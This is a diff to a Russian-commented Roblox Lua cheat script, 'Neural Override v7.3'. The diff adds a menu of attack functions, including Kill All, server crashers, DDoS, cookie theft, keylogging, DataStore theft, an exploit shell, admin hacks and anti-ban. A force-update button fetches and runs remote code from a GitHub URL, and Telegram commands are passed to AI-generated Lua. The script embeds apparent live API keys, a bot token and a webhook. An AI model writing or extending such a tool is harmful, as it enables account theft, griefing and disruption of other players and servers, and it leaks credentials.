@@ -13,7 +13,7 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- ===== НАСТРОЙКИ =====
+-- ===== НАСТРОЙКИ (ВАШИ) =====
 local OPENROUTER_API_KEY = "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"
 local OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
 local MODEL = "openrouter/free"
@@ -23,14 +23,14 @@ local TELEGRAM_BOT_TOKEN = "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M"
 local TELEGRAM_CHAT_ID = "5841362765"
 
 -- ===== НАСТРОЙКИ DISCORD =====
-local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1373226172254650388/itJ1yu8lY1N9_xxyXg_4k61xet1cpycdys6jQhaWmQmFXkABNizWKXEtAqaniSAMFoWP" -- вставьте URL вебхука (опционально)
+local DISCORD_WEBHOOK_URL = "" -- если хотите, вставьте сюда URL
 
 -- ===== НАСТРОЙКИ АВТООБНОВЛЕНИЯ =====
-local AUTO_UPDATE_INTERVAL = 60 -- секунд
+local AUTO_UPDATE_INTERVAL = 60
 local CURRENT_VERSION = "7.3"
 local UPDATE_URL = "https://raw.githubusercontent.com/ffdsdler/Cheat/refs/heads/main/NeuralOverride.lua"
 
--- ===== ВЕБХУК (общий) =====
+-- ===== ВЕБХУК (ОБЩИЙ) =====
 local webhookURL = ""
 
 -- ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
@@ -1105,7 +1105,7 @@ local telegramPolling = false
 local telegramConnection = nil
 
 function telegramSend(message)
-    if TELEGRAM_BOT_TOKEN == "ваш_токен_бота" or TELEGRAM_CHAT_ID == "ваш_chat_id" then
+    if TELEGRAM_BOT_TOKEN == "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M" or TELEGRAM_CHAT_ID == "5841362765" then
         print("[Telegram] Токен или Chat ID не настроены")
         return
     end
@@ -1126,7 +1126,7 @@ function telegramProcessUpdate(update)
     local message = update.message
     if not message then return end
     local chatId = tostring(message.chat.id)
-    if TELEGRAM_CHAT_ID ~= "ваш_chat_id" and chatId ~= TELEGRAM_CHAT_ID then
+    if TELEGRAM_CHAT_ID ~= "5841362765" and chatId ~= TELEGRAM_CHAT_ID then
         print("[Telegram] Сообщение от неавторизованного chat_id: " .. chatId)
         return
     end
@@ -1237,7 +1237,7 @@ end
 
 function startTelegramPolling()
     if telegramPolling then return end
-    if TELEGRAM_BOT_TOKEN == "ваш_токен_бота" then
+    if TELEGRAM_BOT_TOKEN == "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M" then
         print("[Telegram] Токен не настроен!")
         return
     end
@@ -1812,6 +1812,324 @@ end)
 print("🎨 NEURAL OVERRIDE v7.3 UI UPGRADE ЗАГРУЖЕН!")
 
 -- ================================================================
+--  НОВОЕ МЕНЮ С КНОПКАМИ (v7.3)
+-- ================================================================
+
+local function createNewMenu()
+    for _, gui in ipairs(player.PlayerGui:GetChildren()) do
+        if gui.Name:find("NeuralOverrideGUI") or gui.Name:find("TerminatorPanel") or gui.Name:find("RevolutionPanel") or gui.Name:find("ExtraControls") then
+            gui:Destroy()
+        end
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "NeuralOverrideGUI"
+    screenGui.Parent = player.PlayerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 500, 0, 600)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.1, 0)
+    mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
+    mainFrame.BackgroundTransparency = 0.15
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainFrame
+    local shadow = Instance.new("UIStroke")
+    shadow.Color = Color3.new(0,0,0)
+    shadow.Thickness = 2
+    shadow.Transparency = 0.5
+    shadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    shadow.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Name = "TitleLabel"
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
+    title.BackgroundTransparency = 0.8
+    title.BorderSizePixel = 0
+    title.Text = "🧠 NEURAL OVERRIDE v7.3"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.Parent = mainFrame
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 0)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.new(1, 0, 0)
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextScaled = true
+    closeBtn.Parent = title
+    closeBtn.ZIndex = 10
+    closeBtn.MouseButton1Click:Connect(function()
+        mainFrame.Visible = not mainFrame.Visible
+    end)
+    makeDraggable(mainFrame, title)
+
+    local tabFrame = Instance.new("Frame")
+    tabFrame.Size = UDim2.new(1, 0, 0, 35)
+    tabFrame.Position = UDim2.new(0, 0, 0, 30)
+    tabFrame.BackgroundTransparency = 1
+    tabFrame.Parent = mainFrame
+
+    local tabs = {"Основное", "Боты/Монстры", "Взлом", "Уникальные", "Новые v7.3"}
+    local currentTab = 1
+    local tabButtons = {}
+
+    for i, name in ipairs(tabs) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0.2, -5, 1, -5)
+        btn.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
+        btn.Text = name
+        btn.BackgroundColor3 = (i == 1) and Color3.new(0.3, 0.3, 0.6) or Color3.new(0.2, 0.2, 0.4)
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextScaled = true
+        btn.Parent = tabFrame
+        btn.MouseButton1Click:Connect(function()
+            for _, b in ipairs(tabButtons) do
+                b.BackgroundColor3 = Color3.new(0.2, 0.2, 0.4)
+            end
+            btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.6)
+            currentTab = i
+            updateContent()
+        end)
+        table.insert(tabButtons, btn)
+    end
+
+    local contentFrame = Instance.new("ScrollingFrame")
+    contentFrame.Size = UDim2.new(1, 0, 1, -65)
+    contentFrame.Position = UDim2.new(0, 0, 0, 65)
+    contentFrame.BackgroundTransparency = 1
+    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    contentFrame.ScrollBarThickness = 8
+    contentFrame.Parent = mainFrame
+
+    local layout = Instance.new("UIListLayout")
+    layout.Padding = UDim.new(0, 5)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Parent = contentFrame
+
+    local function addButton(text, callback, color)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -10, 0, 35)
+        btn.Text = text
+        btn.BackgroundColor3 = color or Color3.new(0.2, 0.2, 0.8)
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextScaled = true
+        btn.Parent = contentFrame
+        btn.MouseButton1Click:Connect(callback)
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 8)
+        corner.Parent = btn
+        local bg = btn.BackgroundColor3
+        btn.MouseEnter:Connect(function()
+            btn.BackgroundColor3 = bg:Lerp(Color3.new(1,1,1), 0.3)
+        end)
+        btn.MouseLeave:Connect(function()
+            btn.BackgroundColor3 = bg
+        end)
+        btn.MouseButton1Down:Connect(function()
+            btn.BackgroundColor3 = bg:Lerp(Color3.new(0,0,0), 0.3)
+            task.wait(0.1)
+            btn.BackgroundColor3 = bg
+        end)
+        task.defer(function()
+            contentFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+        end)
+    end
+
+    function updateContent()
+        for _, child in ipairs(contentFrame:GetChildren()) do
+            if child:IsA("TextButton") then child:Destroy() end
+        end
+
+        if currentTab == 1 then
+            addButton("✈️ Fly", toggleFly, Color3.new(0,0.8,1))
+            addButton("📡 Teleport", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                if name and name ~= "" then teleportToPlayer(name) end
+            end, Color3.new(0,1,0.5))
+            addButton("🛡️ God Mode", toggleGod, Color3.new(0.5,0.5,1))
+            addButton("🔫 Spawn Weapon", spawnWeapon, Color3.new(1,0.5,0))
+            addButton("📨 Mass Invite", massInvite, Color3.new(0.2,1,0.6))
+            addButton("👥 Summon All", summonAllPlayers, Color3.new(1,0.8,0))
+            addButton("🌀 All Modes", allModes, Color3.new(0.8,0,0.8))
+            addButton("💀 Kill All", killAll, Color3.new(1,0,0))
+            addButton("🚀 Fly All", flyAll, Color3.new(0,0.8,0.8))
+            addButton("🌍 Global Chaos", globalChaos, Color3.new(0.9,0.1,0.5))
+            addButton("🚀 Invade", invade, Color3.new(0.8,0.4,0))
+            addButton("💥 Server Crasher", serverCrasher, Color3.new(1,0.2,0.2))
+            addButton("🧊 Freeze All", freezeAll, Color3.new(0,0.6,1))
+            addButton("🦴 Ragdoll All", ragdollAll, Color3.new(0.8,0.5,0))
+            addButton("👥 Teleport All to Me", teleportAllToMe, Color3.new(0.9,0.5,0.8))
+        elseif currentTab == 2 then
+            addButton("🧟 Spawn Bots (10)", function() spawnBots(10) end, Color3.new(0.8,0.6,0))
+            addButton("🧟 Spawn Bots (50)", function() spawnBots(50) end, Color3.new(0.8,0.6,0))
+            addButton("👹 Smart Monsters (10)", function() spawnSmartMonsters(10) end, Color3.new(0.8,0,0.6))
+            addButton("👹 Smart Monsters (30)", function() spawnSmartMonsters(30) end, Color3.new(0.8,0,0.6))
+            addButton("🌀 Portal (5)", function() createPortals(5) end, Color3.new(0.5,0,0.8))
+            addButton("🌀 Portal (15)", function() createPortals(15) end, Color3.new(0.5,0,0.8))
+            addButton("🤖 AutoBot", function() createAutoBot() end, Color3.new(0.2,0.8,0.8))
+            addButton("👑 God Bot", godBotMode, Color3.new(0.8,0.8,0))
+            addButton("👥 Clone Player", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                if name and name ~= "" then clonePlayer(name) end
+            end, Color3.new(0.2,0.4,0.8))
+            addButton("🏃 Follow Me", followMe, Color3.new(0,0.6,0.6))
+            addButton("👾 Clone Army (50)", function() cloneArmy(50) end, Color3.new(0.6,0.2,0.9))
+        elseif currentTab == 3 then
+            addButton("💀 Hack Target", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
+                if name and name ~= "" then hackTarget(name) end
+            end, Color3.new(1,0,0))
+            addButton("💀 DDoS Target", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
+                if name and name ~= "" then ddosTarget(name) end
+            end, Color3.new(1,0.3,0))
+            addButton("👁️ Track Player", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
+                if name and name ~= "" then trackPlayer(name) end
+            end, Color3.new(0,0.8,0.8))
+            addButton("💥 Remote Ban", remoteBan, Color3.new(0.8,0,0.8))
+            addButton("💥 Game Crash", crashGame, Color3.new(1,0.5,0))
+            addButton("📦 Steal DataStore", stealDataStore, Color3.new(0.2,0.6,1))
+            addButton("🍪 Steal Cookie", stealCookie, Color3.new(0.2,0.8,0.4))
+            addButton("⌨️ Keylog", toggleKeylog, Color3.new(0.5,0.5,0.5))
+            addButton("💻 Exploit Shell", function()
+                local cmd = game:GetService("TextBoxService"):GetTextBox("Команда")
+                if cmd and cmd ~= "" then executeShell(cmd) end
+            end, Color3.new(0.6,0.2,0.4))
+            addButton("🔍 Hack All", hackAll, Color3.new(0.9,0.2,0.2))
+            addButton("📡 Admin Panel", function()
+                local prompt = "Сгенерируй Lua-код для создания админ-панели в Roblox: GUI с кнопками (кик, бан, телепорт, дать предмет)."
+                aiCommand(prompt)
+            end, Color3.new(0.3,0.8,0.3))
+            addButton("🛡 Bypass Defenses", bypassAllDefenses, Color3.new(0.1,0.9,0.1))
+            addButton("🔓 Admin Hack", adminHack, Color3.new(0.8,0.4,0))
+            addButton("📡 Взлом через AI", function()
+                local prompt = game:GetService("TextBoxService"):GetTextBox("Введите запрос для нейросети")
+                if prompt and prompt ~= "" then aiCommand(prompt) end
+            end, Color3.new(0.5,0.5,0.8))
+        elseif currentTab == 4 then
+            addButton("🎯 Aimbot", toggleAimbot, Color3.new(0,1,0.3))
+            addButton("🎯 Silent Aim", toggleSilentAim, Color3.new(0,0.8,0.5))
+            addButton("👁️ ESP", toggleESP, Color3.new(0,0.5,1))
+            addButton("🚫 Anti-Kick", toggleAntiKick, Color3.new(1,0.5,0))
+            addButton("💨 Speed (100)", function() setSpeed(100) end, Color3.new(0.2,0.8,0.8))
+            addButton("💨 Speed (200)", function() setSpeed(200) end, Color3.new(0.2,0.8,0.8))
+            addButton("🧱 NoClip", toggleNoClip, Color3.new(0.6,0.3,0.9))
+            addButton("🦘 Infinite Jump", toggleInfiniteJump, Color3.new(0,1,0.6))
+            addButton("👻 Invisible", toggleInvisible, Color3.new(0.4,0.4,0.8))
+            addButton("☀️ FullBright", setFullBright, Color3.new(1,1,0.2))
+            addButton("💬 Anti-AFK", toggleAntiAFK, Color3.new(0.3,0.7,0.4))
+            addButton("🌀 Infinite Yield", function() infiniteYield() end, Color3.new(0.8,0.2,0.6))
+            addButton("🛡️ Anti-Ban", antiBan, Color3.new(0,0.6,0.6))
+            addButton("🧹 Clear GUI", clearGUI, Color3.new(0.4,0.4,0.4))
+            addButton("💥 Spawn Parts (500)", function() spawnParts(500) end, Color3.new(0.8,0.4,0.2))
+            addButton("🧠 Mind Control", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                if name and name ~= "" then mindControl(name) end
+            end, Color3.new(0.8,0.2,0.8))
+            addButton("👤 Fake Player", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя фейка")
+                if name and name ~= "" then createFakePlayer(name) end
+            end, Color3.new(0.2,0.6,0.8))
+            addButton("🌤️ Weather", function()
+                local type = game:GetService("TextBoxService"):GetTextBox("Тип погоды (дождь/снег/туман/буря)")
+                if type and type ~= "" then changeWeather(type) end
+            end, Color3.new(0.2,0.8,0.6))
+            addButton("🌀 Zone (low gravity)", createZone, Color3.new(0.6,0.2,0.6))
+            addButton("🏗️ Build", function()
+                local desc = game:GetService("TextBoxService"):GetTextBox("Описание постройки")
+                if desc and desc ~= "" then buildFromDescription(desc) end
+            end, Color3.new(0.8,0.5,0.2))
+            addButton("⚔️ Force PvP", forcePvP, Color3.new(0.8,0.2,0))
+            addButton("☠️ Curse Player", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                if name and name ~= "" then cursePlayer(name) end
+            end, Color3.new(0.2,0.2,0.8))
+            addButton("🔄 Invert Controls", invertControls, Color3.new(0.5,0.5,0))
+            addButton("🎒 Scramble Inventory", scrambleInventory, Color3.new(0.8,0.6,0.4))
+            addButton("🐾 Steal Pet", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                if name and name ~= "" then stealPet(name) end
+            end, Color3.new(0.2,0.8,0.4))
+            addButton("🚫 Fake Ban", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                if name and name ~= "" then fakeBan(name) end
+            end, Color3.new(0.8,0.2,0.4))
+            addButton("🎵 Music All", function()
+                local id = game:GetService("TextBoxService"):GetTextBox("ID музыки")
+                if id and id ~= "" then playMusicForAll(id) end
+            end, Color3.new(0.2,0.8,0.8))
+            addButton("📢 Notify All", function()
+                local text = game:GetService("TextBoxService"):GetTextBox("Текст уведомления")
+                if text and text ~= "" then notifyAll(text) end
+            end, Color3.new(0.8,0.8,0.2))
+            addButton("👥 Clone Control", cloneWithControl, Color3.new(0.6,0.4,0.8))
+            addButton("👻 Possession", possession, Color3.new(0.8,0,0.8))
+            addButton("⏳ Time Warp", function()
+                local speed = game:GetService("TextBoxService"):GetTextBox("Скорость (число)")
+                if speed and speed ~= "" then timeWarp(tonumber(speed) or 2) end
+            end, Color3.new(0.2,0.4,0.8))
+            addButton("💣 Spawn Trap", spawnTrap, Color3.new(0.8,0.4,0.2))
+            addButton("🏝️ Spawn Island", spawnIsland, Color3.new(0,0.6,0.6))
+            addButton("💬 Chat Control", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                local msg = game:GetService("TextBoxService"):GetTextBox("Сообщение")
+                if name and msg and name~="" and msg~="" then chatControl(name, msg) end
+            end, Color3.new(0.4,0.4,0.8))
+        elseif currentTab == 5 then
+            addButton("🏙️ Создать город", function()
+                local desc = game:GetService("TextBoxService"):GetTextBox("Опишите город (или оставьте пустым)")
+                spawnCity(desc or nil)
+            end, Color3.new(0.2,0.6,0.8))
+            addButton("🏰 Военная база", function() spawnCity("военная база с бункерами, ангарами и вышками") end, Color3.new(0.2,0.8,0.4))
+            addButton("👻 Невидимый сервер", toggleInvisibleServer, Color3.new(0.6,0.2,0.9))
+            addButton("📢 Discord тест", function()
+                sendDiscordLog("✅ Тест из GUI", {title = "Тест", description = "Discord работает!", color = 0x00aaff})
+            end, Color3.new(0.3,0.3,0.8))
+            addButton("🔫 Терминатор", toggleTerminator, Color3.new(1,0.2,0.2))
+            addButton("🛡️ Обход защит", bypassAllDefenses, Color3.new(0.1,0.9,0.1))
+            addButton("💣 Nuke", nuke, Color3.new(1,0.5,0))
+            addButton("👾 Армия клонов (50)", function() cloneArmy(50) end, Color3.new(0,0.8,0.4))
+            addButton("💰 Кража всего инвентаря", stealAllInventory, Color3.new(1,0.8,0))
+            addButton("💥 Mega Crash", megaCrash, Color3.new(1,0,0))
+            addButton("🌀 Инверт реальности", invertReality, Color3.new(0.5,0,0.8))
+            addButton("👻 Призрачный убийца", toggleAssassin, Color3.new(0.6,0.2,0.9))
+            addButton("⏳ Автофарм", startAutoFarm, Color3.new(0.2,0.6,0.2))
+            addButton("🔓 Взлом админки", adminHack, Color3.new(0.8,0.4,0))
+            addButton("🏝️ Летающий остров", spawnIsland, Color3.new(0,0.6,0.6))
+            addButton("💬 Управление чатом", function()
+                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
+                local msg = game:GetService("TextBoxService"):GetTextBox("Сообщение")
+                if name and msg and name~="" and msg~="" then chatControl(name, msg) end
+            end, Color3.new(0.4,0.4,0.8))
+            addButton("🤖 Создать чит", function()
+                local desc = game:GetService("TextBoxService"):GetTextBox("Опишите чит")
+                if desc and desc ~= "" then makeCheat(desc) end
+            end, Color3.new(0.2,0.8,0.8))
+            addButton("📡 Telegram (вкл/выкл)", function()
+                if telegramPolling then stopTelegramPolling() else startTelegramPolling() end
+            end, Color3.new(0.8,0.6,0))
+            addButton("🔄 Принудительное обновление", function()
+                loadstring(game:HttpGet(UPDATE_URL))()
+            end, Color3.new(0.6,0.6,0))
+        end
+    end
+
+    updateContent()
+end
+
+task.wait(1)
+createNewMenu()
+
+-- ================================================================
 --  ОБРАБОТЧИК ВСЕХ КОМАНД (чат)
 -- ================================================================
 player.Chatted:Connect(function(msg)
@@ -1822,7 +2140,6 @@ player.Chatted:Connect(function(msg)
     local arg = parts[2] or ""
     local arg2 = parts[3] or ""
 
-    -- Базовые
     if cmd == "/fly" then toggleFly()
     elseif cmd == "/tp" then teleportToPlayer(arg)
     elseif cmd == "/god" then toggleGod()
@@ -1858,7 +2175,6 @@ player.Chatted:Connect(function(msg)
     elseif cmd == "/dupe" then duplicateItem(arg)
     elseif cmd == "/tpall" then teleportAll()
     elseif cmd == "/silent" then toggleSilentAim()
-    -- Уникальные
     elseif cmd == "/mindcontrol" then mindControl(arg)
     elseif cmd == "/fakeplayer" then createFakePlayer(arg)
     elseif cmd == "/weather" then changeWeather(arg)
@@ -1876,7 +2192,6 @@ player.Chatted:Connect(function(msg)
     elseif cmd == "/possession" then possession()
     elseif cmd == "/timewarp" then timeWarp(tonumber(arg) or 2)
     elseif cmd == "/spawntrap" then spawnTrap()
-    -- Новые (v6.9+)
     elseif cmd == "/megacrash" then megaCrash()
     elseif cmd == "/invertreality" then invertReality()
     elseif cmd == "/make" then makeCheat(arg)
@@ -1888,7 +2203,6 @@ player.Chatted:Connect(function(msg)
     elseif cmd == "/adminhack" then adminHack()
     elseif cmd == "/island" then spawnIsland()
     elseif cmd == "/chatcontrol" then chatControl(arg, arg2)
-    -- Терминатор, обход, голос, телеграм
     elseif cmd == "/terminator" then toggleTerminator()
     elseif cmd == "/bypass" then bypassAllDefenses()
     elseif cmd == "/voice" then
@@ -1896,7 +2210,6 @@ player.Chatted:Connect(function(msg)
         voiceCommand(text)
     elseif cmd == "/telegram" then
         if telegramPolling then stopTelegramPolling() else startTelegramPolling() end
-    -- v7.2/v7.3 новые
     elseif cmd == "/invisibleserver" then toggleInvisibleServer()
     elseif cmd == "/city" then
         local desc = string.sub(msg, 6)
@@ -1906,7 +2219,6 @@ player.Chatted:Connect(function(msg)
     elseif cmd == "/discord" then
         sendDiscordLog("✅ **Команда /discord выполнена**", {title = "Тест", description = "Discord интеграция работает!", color = 0x00aaff})
         print("[Discord] Тест отправлен")
-    -- Универсальные
     elseif cmd == "/ai" then aiCommand(arg)
     elseif cmd == "/save" then saveScript(arg, arg2)
     elseif cmd == "/run" then runScript(arg)
@@ -2170,12 +2482,7 @@ function chatControl(target, message)
     if code then executeLua(code) end
 end
 
--- ===== ДОПОЛНИТЕЛЬНЫЕ ПАНЕЛИ (упрощённо, но с UI апгрейдом) =====
-local function addExtraPanels()
-    -- Панель Терминатора (уже есть в коде, но можно добавить)
-end
-
--- ===== ЗАПУСК TELEGRAM =====
+-- ===== ЗАПУСК =====
 if TELEGRAM_BOT_TOKEN ~= "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M" then
     startTelegramPolling()
 end
